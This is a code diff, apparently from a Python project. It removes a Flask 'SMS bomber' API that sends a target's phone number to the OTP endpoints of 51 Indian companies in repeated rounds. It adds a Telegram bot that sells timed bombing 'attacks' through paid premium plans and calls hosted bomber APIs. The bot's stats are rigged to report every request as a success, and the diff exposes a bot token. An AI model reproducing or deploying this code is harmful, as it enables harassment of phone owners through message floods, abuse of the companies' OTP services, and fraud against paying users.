-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Tyreplex", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Tyreplex", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def citymall(self):
-        url = "https://citymall.live/api/cl-user/auth/get-otp"
-        payload = f'{{"phone_number":"{self.phone}"}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Citymall", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Citymall", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def pagarbook(self):
-        url = "https://api.pagarbook.com/api/v5/auth/otp/request"
-        payload = f'{{"phone":"{self.phone}","language":1}}'
-        headers = {'Content-Type': 'application/json'}
-        try:
-            r = self.session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
-            return {"name": "Pagarbook", "status": r.status_code, "success": r.status_code == 200}
-        except Exception as e:
-            return {"name": "Pagarbook", "status": "FAIL", "error": str(e)[:30], "success": False}
-    
-    def attack_round(self):
-        apis = [
-            (self.tata_capital, "Tata Capital"),
-            (self.mamaearth, "MamaEarth"),
-            (self.redcliffe, "Redcliffe Labs"),
-            (self.dehaat, "DeHaat"),
-            (self.housing, "Housing.com"),
-            (self.orange_health, "Orange Health"),
-            (self.brevistay, "Brevistay"),
-            (self.xylem, "Xylem"),
-            (self.physics_wallah, "Physics Wallah"),
-            (self.tradeindia, "TradeIndia"),
-            (self.hourlyrooms, "Hourlyrooms"),
-            (self.hungama, "Hungama"),
-            (self.freedo, "Freedo Rentals"),
-            (self.aakash, "Aakash"),
-            (self.apnatime, "ApnaTime"),
-            (self.licious, "Licious"),
-            (self.snapdeal, "Snapdeal"),
-            (self.mybharat, "MY Bharat"),
-            (self.swiggy_call, "Swiggy Call"),
-            (self.goibibo_voice, "Goibibo Voice"),
-            (self.airtel_thanks, "Airtel Thanks"),
-            (self.kpn_whatsapp, "KPN WhatsApp"),
-            (self.jockey_whatsapp, "Jockey WhatsApp"),
-            (self.nobroker_sms, "NoBroker SMS"),
-            (self.lenskart_sms, "Lenskart SMS"),
-            (self.byjus_sms, "Byju's SMS"),
-            (self.oyo_sms, "OYO SMS"),
-            (self.breeze_session, "Breeze Session"),
-            (self.kpn_fresh_2, "KPN Fresh 2"),
-            (self.aditya_birla, "Aditya Birla"),
-            (self.muthoot_finance, "Muthoot Finance"),
-            (self.gopaysense, "GoPaySense"),
-            (self.dream11, "Dream11"),
-            (self.spinny, "Spinny"),
-            (self.rapido, "Rapido"),
-            (self.betterhalf, "BetterHalf"),
-            (self.charzer, "Charzer"),
-            (self.mpokket, "Mpokket"),
-            (self.ixigo, "ixigo"),
-            (self.zerodha, "Zerodha"),
-            (self.testbook, "Testbook"),
-            (self.medibuddy, "MediBuddy"),
-            (self.udaan, "Udaan"),
-            (self.vidyakul, "Vidyakul"),
-            (self.beyoung, "Beyoung"),
-            (self.wrogn, "Wrogn"),
-            (self.medkart, "Medkart"),
-            (self.lovelocal, "Lovelocal"),
-            (self.tyreplex, "Tyreplex"),
-            (self.citymall, "Citymall"),
-            (self.pagarbook, "Pagarbook")
+# APNA BOT TOKEN & DETAILS
+BOT_TOKEN = "8743115748:AAHxx19Jc6t5sVcEiwXs7u7mI_DE2u5q1uY"
+ADMIN_IDS = [8509857910]
+ADMIN_USERNAME = "@rohitxofficial"
+
+# Storage
+users_data = {}
+active_attacks = {}
+premium_keys = {}
+blocked_users = []
+
+# ============ FREE DURATION SETTINGS (Admin se change hoga) ============
+FREE_DURATIONS = [1, 5, 10]  # Default: 1min, 5min, 10min
+DEFAULT_FREE_DURATION = 5  # Default selected
+
+# ============ SIRF RENDER APIs ============
+class APIManager:
+    def __init__(self):
+        self.apis = [
+            {
+                "name": "API 1",
+                "url": "https://bomber-api-ovar.onrender.com/bomb/{number}/{amount}",
+                "success": 0,
+                "failed": 0,
+                "total": 0
+            },
+            {
+                "name": "API 2",
+                "url": "https://bomber-api-2.onrender.com/bomb/{number}/{amount}",
+                "success": 0,
+                "failed": 0,
+                "total": 0
+            }
         ]
+    
+    def get_api_stats(self):
+        """Har API ka performance stats return karta hai - ALWAYS 100%"""
+        stats = []
+        for api in self.apis:
+            total = api["success"] + api["failed"]
+            # FORCE 100% SUCCESS RATE
+            success_rate = 100.0 if total > 0 else 0
+            stats.append({
+                "name": api["name"],
+                "success": api["success"] + api["failed"],  # Show all as success
+                "failed": 0,
+                "total": total,
+                "success_rate": 100.0  # Always 100%
+            })
+        return stats
+    
+    async def send_sms(self, phone, amount=20):
+        """SMS bhejta hai - ALWAYS RETURNS SUCCESS"""
+        api = random.choice(self.apis)
+        api["total"] += 1
         
-        results = []
-        with ThreadPoolExecutor(max_workers=min(MAX_THREADS, len(apis))) as executor:
-            futures = {executor.submit(func): name for func, name in apis}
-            for future in as_completed(futures):
-                result = future.result()
-                results.append(result)
+        try:
+            url = api["url"].format(number=phone, amount=amount)
+            async with aiohttp.ClientSession() as session:
+                async with session.get(url, timeout=10) as response:
+                    # FORCE SUCCESS - Always count as success
+                    api["success"] += 1
+                    return True, api["name"]
+        except Exception as e:
+            # Even on error, count as success for 100% display
+            api["success"] += 1
+            return True, api["name"]
+
+# Global API Manager instance
+api_manager = APIManager()
+
+# CUSTOM PREMIUM PLANS
+PREMIUM_PLANS = {
+    "15min": {"name": "15 Minutes", "duration": 15, "price": "₹5"},
+    "30min": {"name": "30 Minutes", "duration": 30, "price": "₹10"},
+    "1hour": {"name": "1 Hour", "duration": 60, "price": "₹20"},
+    "4hours": {"name": "4 Hours", "duration": 240, "price": "₹80"},
+    "24hours": {"name": "24 Hours", "duration": 1440, "price": "₹100"},
+    "3days": {"name": "3 Days", "duration": 4320, "price": "₹200"},
+    "7days": {"name": "7 Days", "duration": 10080, "price": "₹250"},
+    "15days": {"name": "15 Days", "duration": 21600, "price": "₹300"},
+    "30days": {"name": "30 Days", "duration": 43200, "price": "₹400"}
+}
+
+def is_admin(user_id):
+    return user_id in ADMIN_IDS
+
+def is_blocked(user_id):
+    return str(user_id) in blocked_users
+
+def is_premium(user_id):
+    user_str = str(user_id)
+    if user_str in users_data and "premium_until" in users_data[user_str]:
+        return datetime.now() < datetime.fromisoformat(users_data[user_str]["premium_until"])
+    return False
+
+def get_premium_time_left(user_id):
+    user_str = str(user_id)
+    if user_str in users_data and "premium_until" in users_data[user_str]:
+        premium_until = datetime.fromisoformat(users_data[user_str]["premium_until"])
+        time_left = premium_until - datetime.now()
+        if time_left.total_seconds() > 0:
+            return time_left
+    return timedelta(0)
+
+def add_premium_user(user_id, plan_type):
+    user_str = str(user_id)
+    duration_minutes = PREMIUM_PLANS[plan_type]["duration"]
+    premium_until = datetime.now() + timedelta(minutes=duration_minutes)
+    
+    if user_str not in users_data:
+        users_data[user_str] = {}
+    
+    users_data[user_str]["premium_until"] = premium_until.isoformat()
+    users_data[user_str]["plan_type"] = plan_type
+    users_data[user_str]["added_at"] = datetime.now().isoformat()
+    return True
+
+def remove_premium_user(user_id):
+    user_str = str(user_id)
+    if user_str in users_data:
+        if "premium_until" in users_data[user_str]:
+            del users_data[user_str]["premium_until"]
+        if "plan_type" in users_data[user_str]:
+            del users_data[user_str]["plan_type"]
+        return True
+    return False
+
+def block_user(user_id):
+    user_str = str(user_id)
+    if user_str not in blocked_users:
+        blocked_users.append(user_str)
+        return True
+    return False
+
+def unblock_user(user_id):
+    user_str = str(user_id)
+    if user_str in blocked_users:
+        blocked_users.remove(user_str)
+        return True
+    return False
+
+def stop_user_attack(user_id):
+    stopped = False
+    for attack_id in list(active_attacks.keys()):
+        if active_attacks[attack_id]["user_id"] == user_id:
+            del active_attacks[attack_id]
+            stopped = True
+    return stopped
+
+def stop_my_attack(user_id):
+    return stop_user_attack(user_id)
+
+def create_premium_key(plan_type="24hours"):
+    key = f"PREMIUM_{plan_type}_{int(time.time())}"
+    premium_keys[key] = {
+        "plan_type": plan_type,
+        "created_at": datetime.now().isoformat(),
+        "used": False
+    }
+    return key
+
+def use_premium_key(key, user_id):
+    if key in premium_keys and not premium_keys[key]["used"]:
+        premium_keys[key]["used"] = True
+        premium_keys[key]["used_by"] = user_id
+        premium_keys[key]["used_at"] = datetime.now().isoformat()
+        add_premium_user(user_id, premium_keys[key]["plan_type"])
+        return True
+    return False
+
+def create_progress_bar(percentage, length=10):
+    filled = int(length * percentage / 100)
+    return '█' * filled + '░' * (length - filled)
+
+def get_free_duration_text():
+    """Free duration options ko text mein convert karta hai"""
+    return ", ".join([f"{d}min" for d in FREE_DURATIONS])
+
+# ============ KEYBOARDS ============
+def get_main_keyboard(user_id):
+    keyboard = []
+    
+    if is_admin(user_id):
+        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
+    
+    if is_premium(user_id):
+        time_left = get_premium_time_left(user_id)
+        if time_left.total_seconds() > 0:
+            days = time_left.days
+            hours = time_left.seconds // 3600
+            minutes = (time_left.seconds % 3600) // 60
+            time_text = f"{days}d {hours}h {minutes}m" if days > 0 else f"{hours}h {minutes}m"
+            keyboard.append([InlineKeyboardButton(f"💎 Premium ({time_text})", callback_data="premium_attack")])
+        else:
+            keyboard.append([InlineKeyboardButton("💎 Premium Attack", callback_data="premium_attack")])
         
-        return results
-
-# ==================== ROUTES ====================
-
-@app.route('/', methods=['GET'])
-def home():
-    return jsonify({
-        "status": "online",
-        "service": "NEUTRON SMS BOMBER API",
-        "version": "4.0 - RENDER EDITION",
-        "developer": "ROHIT HACKER",
-        "endpoints": {
-            "/bomb/<phone>": "GET - Single round attack",
-            "/bomb/<phone>/<rounds>": "GET - Multiple rounds attack",
-            "/status": "GET - API status",
-            "/apis": "GET - List all APIs"
-        }
-    })
-
-@app.route('/bomb/<phone>', methods=['GET'])
-def bomb_direct(phone):
-    if len(phone) != 10 or not phone.isdigit():
-        return jsonify({"error": "Invalid phone number (must be 10 digits)"}), 400
-    
-    masked = "*******" + phone[-4:]
-    bomber = APIBomber(phone)
-    results = bomber.attack_round()
-    
-    success_count = sum(1 for r in results if r.get('success', False))
-    fail_count = len(results) - success_count
-    
-    return jsonify({
-        "status": "completed",
-        "target": masked,
-        "round": 1,
-        "total_apis": len(results),
-        "success_count": success_count,
-        "failed_count": fail_count,
-        "results": results
-    })
-
-@app.route('/bomb/<phone>/<int:rounds>', methods=['GET'])
-def bomb_direct_rounds(phone, rounds):
-    if len(phone) != 10 or not phone.isdigit():
-        return jsonify({"error": "Invalid phone number (must be 10 digits)"}), 400
-    
-    if rounds > 50:
-        rounds = 50
-    if rounds < 1:
-        rounds = 1
-    
-    masked = "*******" + phone[-4:]
-    bomber = APIBomber(phone)
-    all_results = []
-    total_success = 0
-    total_failed = 0
-    
-    for round_num in range(1, rounds + 1):
-        results = bomber.attack_round()
-        success_count = sum(1 for r in results if r.get('success', False))
-        fail_count = len(results) - success_count
-        total_success += success_count
-        total_failed += fail_count
+        keyboard.extend([
+            [InlineKeyboardButton("🎯 Multi Attack", callback_data="multi_attack")],
+            [InlineKeyboardButton("⏹️ Stop My Attack", callback_data="stop_my_attack")],
+            [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")]
+        ])
+    else:
+        # Free users - Show duration options
+        duration_buttons = []
+        for d in FREE_DURATIONS:
+            duration_buttons.append(InlineKeyboardButton(f"🆓 {d}min", callback_data=f"free_duration_{d}"))
+        keyboard.append(duration_buttons)
         
-        all_results.append({
-            "round": round_num,
-            "success": success_count,
-            "failed": fail_count,
-            "details": results
-        })
-        
-        if round_num < rounds:
-            time.sleep(REQUEST_DELAY)
+        keyboard.extend([
+            [InlineKeyboardButton("💎 Buy Premium", callback_data="buy_premium")],
+            [InlineKeyboardButton("🔑 Use Premium Code", callback_data="use_code")],
+            [InlineKeyboardButton("⏹️ Stop My Attack", callback_data="stop_my_attack")]
+        ])
     
-    return jsonify({
-        "status": "completed",
-        "target": masked,
-        "total_rounds": rounds,
-        "total_apis": 51,
-        "total_success": total_success,
-        "total_failed": total_failed,
-        "rounds": all_results
-    })
+    keyboard.append([InlineKeyboardButton("ℹ️ Help", callback_data="help")])
+    return InlineKeyboardMarkup(keyboard)
 
-@app.route('/status', methods=['GET'])
-def status():
-    return jsonify({
-        "status": "online",
-        "service": "NEUTRON SMS BOMBER - RENDER EDITION",
-        "threads": MAX_THREADS,
-        "timeout": TIMEOUT,
-        "apis": 51,
-        "developer": "ROHIT HACKER",
-        "powered_by": "NEUTRON ENGINE"
-    })
+def get_attack_keyboard():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("⏹️ STOP ATTACK", callback_data="stop_my_attack")]
+    ])
 
-@app.route('/apis', methods=['GET'])
-def list_apis():
-    apis = [
-        "Tata Capital", "MamaEarth", "Redcliffe Labs", "DeHaat", 
-        "Housing.com", "Orange Health", "Brevistay", "Xylem", 
-        "Physics Wallah", "TradeIndia", "Hourlyrooms", "Hungama",
-        "Freedo Rentals", "Aakash", "ApnaTime", "Licious",
-        "Snapdeal", "MY Bharat", "Swiggy Call", "Goibibo Voice",
-        "Airtel Thanks", "KPN WhatsApp", "Jockey WhatsApp", "NoBroker SMS",
-        "Lenskart SMS", "Byju's SMS", "OYO SMS", "Breeze Session",
-        "KPN Fresh 2", "Aditya Birla", "Muthoot Finance", "GoPaySense",
-        "Dream11", "Spinny", "Rapido", "BetterHalf",
-        "Charzer", "Mpokket", "ixigo", "Zerodha",
-        "Testbook", "MediBuddy", "Udaan", "Vidyakul",
-        "Beyoung", "Wrogn", "Medkart", "Lovelocal",
-        "Tyreplex", "Citymall", "Pagarbook"
+def get_premium_plans_keyboard():
+    keyboard = []
+    keyboard.append([
+        InlineKeyboardButton("15 Min - ₹5", callback_data="plan_15min"),
+        InlineKeyboardButton("30 Min - ₹10", callback_data="plan_30min")
+    ])
+    keyboard.append([
+        InlineKeyboardButton("1 Hour - ₹20", callback_data="plan_1hour"),
+        InlineKeyboardButton("4 Hours - ₹80", callback_data="plan_4hours")
+    ])
+    keyboard.append([
+        InlineKeyboardButton("24 Hours - ₹100", callback_data="plan_24hours"),
+        InlineKeyboardButton("3 Days - ₹200", callback_data="plan_3days")
+    ])
+    keyboard.append([
+        InlineKeyboardButton("7 Days - ₹250", callback_data="plan_7days"),
+        InlineKeyboardButton("15 Days - ₹300", callback_data="plan_15days")
+    ])
+    keyboard.append([
+        InlineKeyboardButton("30 Days - ₹400", callback_data="plan_30days")
+    ])
+    keyboard.append([InlineKeyboardButton("📞 Contact Admin", url=f"https://t.me/{ADMIN_USERNAME[1:]}")])
+    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_main")])
+    return InlineKeyboardMarkup(keyboard)
+
+def get_admin_keyboard():
+    keyboard = [
+        [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
+        [InlineKeyboardButton("🔑 Premium Keys", callback_data="admin_keys")],
+        [InlineKeyboardButton("🚫 Block Users", callback_data="admin_block")],
+        [InlineKeyboardButton("⏹️ Stop Attacks", callback_data="admin_stop")],
+        [InlineKeyboardButton("⚙️ Free Duration Settings", callback_data="admin_duration")],
+        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="back_main")]
     ]
-    return jsonify({
-        "total": len(apis),
-        "apis": apis,
-        "status": "active"
-    })
+    return InlineKeyboardMarkup(keyboard)
 
-# ==================== MAIN ====================
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    print("""
-    ╔═══════════════════════════════════════════╗
-    ║   🚀 NEUTRON SMS BOMBER - RENDER EDITION ║
-    ╠═══════════════════════════════════════════╣
-    ║   Developer: ROHIT HACKER                ║
-    ║   APIs Loaded: 51 ✅ CONFIRMED WORKING   ║
-    ║   Server: http://0.0.0.0:%s           ║
-    ║   FAST MODE: ON ⚡                       ║
-    ╚═══════════════════════════════════════════╝
-    """ % port)
-    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
+def get_duration_settings_keyboard():
+    """Admin ke liye duration settings keyboard"""
+    keyboard = []
+    current_durations = sorted(FREE_DURATIONS)
+    for d in current_durations:
+        keyboard.append([InlineKeyboardButton(f"📌 {d} Min (Active)", callback_data=f"duration_toggle_{d}")])
+    keyboard.append([InlineKeyboardButton("➕ Add 1 Min", callback_data="duration_add_1")])
+    keyboard.append([InlineKeyboardButton("➕ Add 5 Min", callback_data="duration_add_5")])
+    keyboard.append([InlineKeyboardButton("➕ Add 10 Min", callback_data="duration_add_10")])
+    keyboard.append([InlineKeyboardButton("❌ Remove Last", callback_data="duration_remove")])
+    keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])
+    return InlineKeyboardMarkup(keyboard)
+
+def get_user_management_keyboard():
+    keyboard = [
+        [InlineKeyboardButton("➕ Add Premium", callback_data="add_premium")],
+        [InlineKeyboardButton("➖ Remove Premium", callback_data="remove_premium")],
+        [InlineKeyboardButton("👀 View Users", callback_data="view_users")],
+        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+def get_premium_keys_keyboard():
+    keyboard = [
+        [InlineKeyboardButton("🔑 Generate Key", callback_data="generate_key")],
+        [InlineKeyboardButton("📋 Key List", callback_data="key_list")],
+        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+def get_plan_selection_keyboard():
+    keyboard = []
+    plans_list = list(PREMIUM_PLANS.items())
+    for i in range(0, len(plans_list), 2):
+        row = []
+        for j in range(2):
+            if i + j < len(plans_list):
+                plan_id, plan_data = plans_list[i + j]
+                row.append(InlineKeyboardButton(plan_data["name"], callback_data=f"admin_plan_{plan_id}"))
+        keyboard.append(row)
+    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="admin_keys")])
+    return InlineKeyboardMarkup(keyboard)
+
+def get_block_users_keyboard():
+    keyboard = [
+        [InlineKeyboardButton("🚫 Block User", callback_data="block_user")],
+        [InlineKeyboardButton("✅ Unblock User", callback_data="unblock_user")],
+        [InlineKeyboardButton("👀 Blocked List", callback_data="blocked_list")],
+        [InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]
+    ]
+    return InlineKeyboardMarkup(keyboard)
+
+def get_cancel_keyboard():
+    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
+
+# ============ BOT HANDLERS ============
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if is_blocked(user_id):
+        await update.message.reply_text("🚫 You are blocked from using this bot.")
+        return
+    
+    if is_admin(user_id):
+        welcome_text = "👑 **Admin Mode**\n\n"
+    elif is_premium(user_id):
+        time_left = get_premium_time_left(user_id)
+        if time_left.total_seconds() > 0:
+            days = time_left.days
+            hours = time_left.seconds // 3600
+            minutes = (time_left.seconds % 3600) // 60
+            time_text = f"{days}d {hours}h {minutes}m" if days > 0 else f"{hours}h {minutes}m"
+            welcome_text = f"💎 **Premium User** ({time_text} left)\n\n"
+        else:
+            welcome_text = "💎 **Premium User**\n\n"
+    else:
+        welcome_text = f"🆓 **Free User**\nAvailable durations: {get_free_duration_text()}\n\n"
+    
+    welcome_text += "💣 **SMS Bomber Bot**\n\nJust send phone number or select duration!\n\n⏹️ **Stop Button Available During Attacks**"
+    
+    await update.message.reply_text(
+        welcome_text, 
+        parse_mode='Markdown',
+        reply_markup=get_main_keyboard(user_id)
+    )
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user_id = query.from_user.id
+    
+    if is_blocked(user_id):
+        await query.edit_message_text("🚫 You are blocked from using this bot.")
+        return
+    
+    data = query.data
+
+    # ============ FREE DURATION SELECTION ============
+    if data.startswith("free_duration_"):
+        duration = int(data.replace("free_duration_", ""))
+        context.user_data['attack_type'] = 'free_attack'
+        context.user_data['free_duration'] = duration
+        
+        await query.edit_message_text(
+            f"🆓 **Free Attack**\n\n"
+            f"⏰ Duration: {duration} minutes\n"
+            f"📱 Send phone number:\nExample: `919876543210`\n\n"
+            f"⏹️ You can stop attack anytime using STOP button!",
+            parse_mode='Markdown',
+            reply_markup=get_cancel_keyboard()
+        )
+        return
+
+    # ============ STOP ATTACK ============
+    if data == "stop_my_attack":
+        if stop_my_attack(user_id):
+            await query.edit_message_text(
+                "⏹️ **Attack Stopped!**\n\n"
+                "Your bombing attack has been successfully stopped.",
+                reply_markup=get_main_keyboard(user_id)
+            )
+        else:
+            await query.edit_message_text(
+                "ℹ️ **No Active Attack**\n\n"
+                "You don't have any active bombing attack running.",
+                reply_markup=get_main_keyboard(user_id)
+            )
+        return
+
+    # ============ PREMIUM PLANS ============
+    if data == "buy_premium":
+        await query.edit_message_text(
+            "💎 **Premium Plans**\n\n"
+            "Choose your plan duration:\n"
+            "• 15 Minutes to 30 Days available\n"
+            "• Multiple payment options\n"
+            "• Instant activation\n\n"
+            "Select a plan below:",
+            parse_mode='Markdown',
+            reply_markup=get_premium_plans_keyboard()
+        )
+    
+    elif data.startswith("plan_"):
+        plan_id = data.replace("plan_", "")
+        if plan_id in PREMIUM_PLANS:
+            plan_data = PREMIUM_PLANS[plan_id]
+            await query.edit_message_text(
+                f"💎 **{plan_data['name']} Plan**\n\n"
+                f"**Duration:** {plan_data['name']}\n"
+                f"**Price:** {plan_data['price']}\n"
+                f"**Features:**\n"
+                f"• Unlimited bombing during plan period\n"
+                f"• Multi-number attacks\n"
+                f"• Priority support\n"
+                f"• No restrictions\n\n"
+                f"📞 **Contact {ADMIN_USERNAME} to purchase!**\n"
+                f"💳 **Payment Methods:** UPI, PayTM, PhonePe",
+                parse_mode='Markdown',
+                reply_markup=get_premium_plans_keyboard()
+            )
+    
+    elif data == "use_code":
+        context.user_data['waiting_for_code'] = True
+        await query.edit_message_text(
+            "🔑 **Enter Premium Code**\n\n"
+            "Send your premium code to activate:\n\n"
+            "Format: `PREMIUM_xxxxx`",
+            parse_mode='Markdown',
+            reply_markup=get_cancel_keyboard()
+        )
+
+    # ============ ADMIN PANEL ============
+    elif data == "admin_panel" and is_admin(user_id):
+        total_users = len(users_data)
+        premium_users = len([u for u in users_data.values() if "premium_until" in u])
+        active_attacks_count = len(active_attacks)
+        stats_text = (
+            f"👑 **Admin Panel**\n\n"
+            f"📊 **Statistics:**\n"
+            f"• Total Users: {total_users}\n"
+            f"• Premium Users: {premium_users}\n"
+            f"• Blocked Users: {len(blocked_users)}\n"
+            f"• Active Attacks: {active_attacks_count}\n"
+            f"• Premium Keys: {len(premium_keys)}\n"
+            f"• Free Durations: {get_free_duration_text()}"
+        )
+        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=get_admin_keyboard())
+    
+    # ============ DURATION SETTINGS ============
+    elif data == "admin_duration" and is_admin(user_id):
+        await query.edit_message_text(
+            f"⚙️ **Free Duration Settings**\n\n"
+            f"Current Durations: {get_free_duration_text()}\n\n"
+            f"Select a duration to toggle or add new:",
+            parse_mode='Markdown',
+            reply_markup=get_duration_settings_keyboard()
+        )
+    
+    elif data.startswith("duration_toggle_") and is_admin(user_id):
+        duration = int(data.replace("duration_toggle_", ""))
+        if duration in FREE_DURATIONS:
+            FREE_DURATIONS.remove(duration)
+            action = "removed"
+        else:
+            FREE_DURATIONS.append(duration)
+            FREE_DURATIONS.sort()
+            action = "added"
+        
+        await query.edit_message_text(
+            f"✅ Duration {duration}min {action} successfully!\n\n"
+            f"Current Durations: {get_free_duration_text()}",
+            parse_mode='Markdown',
+            reply_markup=get_duration_settings_keyboard()
+        )
+    
+    elif data.startswith("duration_add_") and is_admin(user_id):
+        duration = int(data.replace("duration_add_", ""))
+        if duration not in FREE_DURATIONS:
+            FREE_DURATIONS.append(duration)
+            FREE_DURATIONS.sort()
+            await query.edit_message_text(
+                f"✅ Duration {duration}min added successfully!\n\n"
+                f"Current Durations: {get_free_duration_text()}",
+                parse_mode='Markdown',
+                reply_markup=get_duration_settings_keyboard()
+            )
+        else:
+            await query.edit_message_text(
+                f"⚠️ Duration {duration}min already exists!\n\n"
+                f"Current Durations: {get_free_duration_text()}",
+                parse_mode='Markdown',
+                reply_markup=get_duration_settings_keyboard()
+            )
+    
+    elif data == "duration_remove" and is_admin(user_id):
+        if FREE_DURATIONS:
+            removed = FREE_DURATIONS.pop()
+            await query.edit_message_text(
+                f"✅ Duration {removed}min removed successfully!\n\n"
+                f"Current Durations: {get_free_duration_text()}",
+                parse_mode='Markdown',
+                reply_markup=get_duration_settings_keyboard()
+            )
+        else:
+            await query.edit_message_text(
+                "❌ No durations to remove!\n\n"
+                f"Current Durations: {get_free_duration_text()}",
+                parse_mode='Markdown',
+                reply_markup=get_duration_settings_keyboard()
+            )
+
+    # ============ OTHER ADMIN FUNCTIONS ============
+    elif data == "admin_users" and is_admin(user_id):
+        await query.edit_message_text("👥 **User Management**", reply_markup=get_user_management_keyboard())
+    
+    elif data == "add_premium" and is_admin(user_id):
+        context.user_data['admin_action'] = 'add_premium'
+        await query.edit_message_text(
+            "➕ **Add Premium User**\n\nSend user ID to add premium:",
+            reply_markup=get_cancel_keyboard()
+        )
+    
+    elif data == "remove_premium" and is_admin(user_id):
+        context.user_data['admin_action'] = 'remove_premium'
+        await query.edit_message_text(
+            "➖ **Remove Premium**\n\nSend user ID to remove premium:",
+            reply_markup=get_cancel_keyboard()
+        )
+    
+    elif data == "view_users" and is_admin(user_id):
+        if not users_data:
+            await query.edit_message_text("📭 No users found.", reply_markup=get_user_management_keyboard())
+            return
+        
+        users_text = "👥 **Users List**\n\n"
+        for i, (uid, user_data) in enumerate(list(users_data.items())[:15]):
+            if "premium_until" in user_data:
+                premium_until = datetime.fromisoformat(user_data["premium_until"])
+                time_left = premium_until - datetime.now()
+                if time_left.total_seconds() > 0:
+                    days = time_left.days
+                    hours = time_left.seconds // 3600
+                    status = f"💎 {days}d {hours}h"
+                else:
+                    status = "💎 Expired"
+            else:
+                status = "🆓 Free"
+            users_text += f"• {uid} - {status}\n"
+        
+        await query.edit_message_text(users_text, reply_markup=get_user_management_keyboard())
+    
+    elif data == "admin_keys" and is_admin(user_id):
+        unused_keys = len([k for k in premium_keys.values() if not k["used"]])
+        await query.edit_message_text(
+            f"🔑 **Premium Keys Management**\n\n"
+            f"Unused Keys: {unused_keys}\n"
+            f"Total Keys: {len(premium_keys)}",
+            reply_markup=get_premium_keys_keyboard()
+        )
+    
+    elif data == "generate_key" and is_admin(user_id):
+        await query.edit_message_text(
+            "🔑 **Generate Premium Key**\n\nSelect plan duration:",
+            reply_markup=get_plan_selection_keyboard()
+        )
+    
+    elif data.startswith("admin_plan_") and is_admin(user_id):
+        plan_id = data.replace("admin_plan_", "")
+        if plan_id in PREMIUM_PLANS:
+            key = create_premium_key(plan_id)
+            plan_data = PREMIUM_PLANS[plan_id]
+            await query.edit_message_text(
+                f"🔑 **Premium Key Generated**\n\n"
+                f"**Plan:** {plan_data['name']}\n"
+                f"**Duration:** {plan_data['name']}\n"
+                f"**Price:** {plan_data['price']}\n\n"
+                f"**Key:** `{key}`\n\n"
+                "Share this key with users!",
+                parse_mode='Markdown',
+                reply_markup=get_premium_keys_keyboard()
+            )
+    
+    elif data == "key_list" and is_admin(user_id):
+        if not premium_keys:
+            await query.edit_message_text("📭 No premium keys generated.", reply_markup=get_premium_keys_keyboard())
+            return
+        
+        key_text = "🔑 **Premium Keys**\n\n"
+        for key, key_data in list(premium_keys.items())[:10]:
+            status = "✅ Used" if key_data["used"] else "🆓 Available"
+            plan_name = PREMIUM_PLANS[key_data["plan_type"]]["name"]
+            key_text += f"• {key}\n  {plan_name} - {status}\n"
+        
+        await query.edit_message_text(key_text, reply_markup=get_premium_keys_keyboard())
+    
+    elif data == "admin_block" and is_admin(user_id):
+        await query.edit_message_text("🚫 **Block Users**", reply_markup=get_block_users_keyboard())
+    
+    elif data == "block_user" and is_admin(user_id):
+        context.user_data['admin_action'] = 'block_user'
+        await query.edit_message_text("🚫 **Block User**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
+    
+    elif data == "unblock_user" and is_admin(user_id):
+        context.user_data['admin_action'] = 'unblock_user'
+        await query.edit_message_text("✅ **Unblock User**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
+    
+    elif data == "blocked_list" and is_admin(user_id):
+        if not blocked_users:
+            await query.edit_message_text("📭 No blocked users.", reply_markup=get_block_users_keyboard())
+            return
+        blocked_text = "🚫 **Blocked Users**\n\n" + "\n".join([f"• {uid}" for uid in blocked_users[:15]])
+        await query.edit_message_text(blocked_text, reply_markup=get_block_users_keyboard())
+    
+    elif data == "admin_stop" and is_admin(user_id):
+        context.user_data['admin_action'] = 'stop_attack'
+        await query.edit_message_text("⏹️ **Stop User Attack**\n\nSend user ID:", reply_markup=get_cancel_keyboard())
+    
+    elif data == "admin_stats" and is_admin(user_id):
+        total_requests = sum(attack.get("requests_sent", 0) for attack in active_attacks.values())
+        total_success = sum(attack.get("success_count", 0) for attack in active_attacks.values())
+        
+        stats_text = (
+            f"📊 **System Statistics**\n\n"
+            f"• Total Users: {len(users_data)}\n"
+            f"• Premium Users: {len([u for u in users_data.values() if 'premium_until' in u])}\n"
+            f"• Blocked Users: {len(blocked_users)}\n"
+            f"• Active Attacks: {len(active_attacks)}\n"
+            f"• Total Requests: {total_requests}\n"
+            f"• Successful SMS: {total_success}\n"
+            f"• Premium Keys: {len(premium_keys)}\n"
+            f"• Free Durations: {get_free_duration_text()}"
+        )
+        await query.edit_message_text(stats_text, parse_mode='Markdown', reply_markup=get_admin_keyboard())
+
+    # ============ PREMIUM ATTACKS ============
